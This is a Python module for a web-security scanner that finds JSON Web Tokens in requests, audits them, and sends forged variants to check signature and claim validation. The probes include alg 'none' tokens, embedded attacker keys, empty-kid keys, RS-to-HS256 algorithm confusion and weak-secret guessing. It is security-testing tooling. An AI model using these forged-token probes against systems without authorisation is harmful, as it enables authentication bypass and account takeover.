"""JWT discovery, local audits and controlled signature-validation probes."""
import argparse
import base64
import binascii
import hashlib
import hmac
import json
import re
import time
from dataclasses import replace
from pathlib import Path
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
from uuid import uuid4

from core.headers import without_headers
from core.tooltags import BurpTool
from modules.base import BaseModule

_TOKEN = re.compile(r'(?<![A-Za-z0-9_.-])([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)(?![A-Za-z0-9_.-])')
_HASHES = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
_DEFAULT_SECRETS = ('secret', 'password', '123456', 'changeme', 'jwt_secret', 'your-256-bit-secret')


def encode(value):
    return base64.urlsafe_b64encode(value).rstrip(b'=').decode('ascii')


def decode(value):
    return base64.b64decode(value + '=' * (-len(value) % 4), altchars=b'-_', validate=True)


def unpack(token):
    try:
        header, payload, signature = token.split('.')
        header, payload = json.loads(decode(header)), json.loads(decode(payload))
        decode(signature)
        if isinstance(header, dict) and isinstance(payload, dict) and isinstance(header.get('alg'), str):
            return header, payload
    except (ValueError, UnicodeError, binascii.Error, RecursionError):
        pass
    return None


def build(header, payload, key=None):
    signing = '.'.join(encode(json.dumps(value, separators=(',', ':')).encode()) for value in (header, payload))
    signature = encode(hmac.new(key, signing.encode(), _HASHES[header['alg']]).digest()) if key is not None else ''
    return signing + '.' + signature


def map_strings(value, transform):
    if isinstance(value, str):
        return transform(value)
    if isinstance(value, bytes):
        return transform(value.decode('latin-1')).encode('latin-1')
    if isinstance(value, dict):
        return {key: map_strings(child, transform) for key, child in value.items()}
    if isinstance(value, list):
        return [map_strings(child, transform) for child in value]
    return value


def transform_request(req, transform):
    parts = urlsplit(req.url)
    query = parse_qsl(parts.query, keep_blank_values=True)
    changed = [(name, transform(value)) for name, value in query]
    url = urlunsplit(parts._replace(query=urlencode(changed))) if changed != query else req.url
    body = replace(req.body, value=map_strings(req.body.value, transform)) if req.body else None
    return replace(req, url=url, headers=[transform(header) for header in req.headers],
                   params=[replace(p, value=map_strings(p.value, transform)) for p in req.params], body=body)


def discover(req):
    tokens = {}
    def scan(text):
        for match in _TOKEN.finditer(text):
            token = match.group(1)
            if token not in tokens and (parsed := unpack(token)):
                tokens[token] = parsed
        return text
    transform_request(req, scan)
    return tokens


def substitute(req, token, new):
    def swap(text):
        return _TOKEN.sub(lambda match: new if match.group(1) == token else match.group(0), text)
    variant = transform_request(req, swap)
    # The sender will recompute body lengths after token replacement.
    return replace(variant, headers=without_headers(variant.headers, ['Content-Length', 'Transfer-Encoding']))


class JWT(BaseModule):
    """Audit JWTs and probe signature/claim validation only on requests containing JWTs."""

    tool = BurpTool.SCANNER
    follow_redirects = False
    store_response_cookies = False
    path_options = {'--jwt-secrets': 'file', '--jwt-public-key': 'file'}

    def __init__(self):
        self.secrets = [s.encode() for s in _DEFAULT_SECRETS]
        self.public_key = None
        self.success_text = None

    def option_parser(self):
        parser = argparse.ArgumentParser(prog='jwt', add_help=False, allow_abbrev=False)
        parser.add_argument('--jwt-secrets', help='UTF-8 wordlist for offline HMAC secret checks (replaces small default list)')
        parser.add_argument('--jwt-public-key', help='Public key file, used byte-for-byte for asymmetric-to-HS256 confusion probes')
        parser.add_argument('--jwt-success-text', help='Protected-response marker used instead of exact response-body matching')
        return parser

    def setup(self, args):
        options, _ = self.option_parser().parse_known_args(args)
        if options.jwt_secrets:
            self.secrets = [line.encode() for line in Path(options.jwt_secrets).read_text(encoding='utf-8').splitlines() if line]
            if not self.secrets:
                raise ValueError('--jwt-secrets must contain at least one secret')
        if options.jwt_public_key:
            self.public_key = Path(options.jwt_public_key).read_bytes()
            if not self.public_key:
                raise ValueError('--jwt-public-key must not be empty')
        if options.jwt_success_text is not None and not options.jwt_success_text.strip():
            raise ValueError('--jwt-success-text must not be empty')
        self.success_text = options.jwt_success_text

    def signing_key(self, token, header):
        digest = _HASHES.get(header['alg'])
        if digest is None:
            return None
        message, signature = token.rsplit('.', 1)
        for secret in self.secrets:
            if hmac.compare_digest(hmac.new(secret, message.encode(), digest).digest(), decode(signature)):
                return secret
        return None

    def token_probes(self, token, header, payload, key):
        first, second, signature = token.split('.')
        yield 'invalid-token', 'leviosa-invalid-token'
        raw_signature = decode(signature)
        corrupt = bytes([raw_signature[0] ^ 1]) + raw_signature[1:] if raw_signature else b'leviosa-invalid'
        yield 'invalid-signature', first + '.' + second + '.' + encode(corrupt)
        yield 'empty-signature', first + '.' + second + '.'
        for algorithm in ('none', 'None', 'NONE', 'nOnE'):
            yield 'alg-' + algorithm, build({**header, 'alg': algorithm}, payload)
        tampered = {**payload, 'leviosa_probe': True}
        yield 'tampered-payload', first + '.' + encode(json.dumps(tampered).encode()) + '.' + signature
        # Attacker-selected symmetric JWK tests trust in a token-supplied key.
        attacker_key = b'leviosa-jwt-test-key'
        yield 'embedded-jwk', build({**header, 'alg': 'HS256', 'jwk': {'kty': 'oct', 'k': encode(attacker_key)}}, tampered, attacker_key)
        yield 'kid-empty-key', build({**header, 'alg': 'HS256', 'kid': ''}, tampered, b'')
        if self.public_key and header['alg'].startswith(('RS', 'PS', 'ES')):
            yield 'algorithm-confusion', build({**header, 'alg': 'HS256'}, tampered, self.public_key)
        # Claim enforcement can only be isolated when mutations have valid signatures.
        if key is not None:
            now = int(time.time())
            yield 'expired-claim', build(header, {**payload, 'exp': now - 86400}, key)
            yield 'future-nbf', build(header, {**payload, 'nbf': now + 86400}, key)
            if 'aud' in payload:
                yield 'wrong-audience', build(header, {**payload, 'aud': 'leviosa-invalid-audience'}, key)
            if 'iss' in payload:
                yield 'wrong-issuer', build(header, {**payload, 'iss': 'leviosa-invalid-issuer'}, key)

    async def mutate(self, requests, context):
        return self._variants(requests)

    def _variants(self, requests):
        for req in requests:
            for index, (token, (header, payload)) in enumerate(discover(req).items()):
                group = uuid4().hex
                key = self.signing_key(token, header)
                issues = []
                if header['alg'].lower() == 'none':
                    issues.append('unsigned token')
                if 'exp' not in payload:
                    issues.append('missing expiration claim')
                if 'aud' not in payload:
                    issues.append('missing audience claim (review application requirements)')
                if key is not None:
                    issues.append('HMAC signature verified with a candidate weak secret')
                if urlsplit(req.url).scheme == 'http':
                    issues.append('token transmitted over HTTP')
                if any(token in value for _, value in parse_qsl(urlsplit(req.url).query)) or any(
                        p.type == 'query' and isinstance(p.value, str) and token in p.value for p in req.params):
                    issues.append('token present in query string')
                meta = {'group': group, 'token_index': index, 'algorithm': header['alg'], 'issues': issues}
                yield replace(req, metadata={**req.metadata, 'jwt': {**meta, 'probe': 'baseline'}})
                for probe, value in self.token_probes(token, header, payload, key):
                    variant = substitute(req, token, value)
                    yield replace(variant, metadata={**variant.metadata, 'jwt': {**meta, 'probe': probe}})

    def fingerprint(self, response):
        if not 200 <= response.status < 300:
            return None
        if self.success_text is not None:
            return 'marker' if self.success_text.encode() in response.body else None
        return (response.status, hashlib.sha256(response.body).hexdigest())

    async def analyze_one(self, response, context):
        meta = response.request.metadata.get('jwt')
        if meta is None:
            return
        entry = context.state.setdefault('jwt', {}).setdefault(meta['group'], {'baseline': None, 'control': None, 'control_valid': False, 'hits': []})
        fingerprint = self.fingerprint(response)
        if meta['probe'] == 'baseline':
            entry['baseline'] = fingerprint
            if meta['issues']:
                self.report(response, context, '[JWT] Token audit: ' + '; '.join(meta['issues']),
                            evidence={'token_index': meta['token_index'], 'algorithm': meta['algorithm'], 'issues': meta['issues']})
        elif meta['probe'] == 'invalid-token':
            entry['control'] = fingerprint
            entry['control_valid'] = response.status in {401, 403} or 200 <= response.status < 300
        elif fingerprint is not None:
            entry['hits'].append((replace(response, body=b'', traffic=[]), fingerprint))

    async def finalize(self, context):
        for entry in context.state.pop('jwt', {}).values():
            baseline = entry['baseline']
            if baseline is None or not entry['control_valid'] or baseline == entry['control']:
                continue
            for response, fingerprint in entry['hits']:
                if fingerprint != baseline:
                    continue
                meta = response.request.metadata['jwt']
                self.report(response, context,
                            f'[JWT] Possible validation weakness: {meta["probe"]}; baseline response matched and invalid-token control differed',
                            evidence={'probe': meta['probe'], 'token_index': meta['token_index'],
                                      'algorithm': meta['algorithm'], 'status': response.status,
                                      'comparison': 'success-marker' if self.success_text else 'exact-status-and-body'},
                            confidence='indicator')
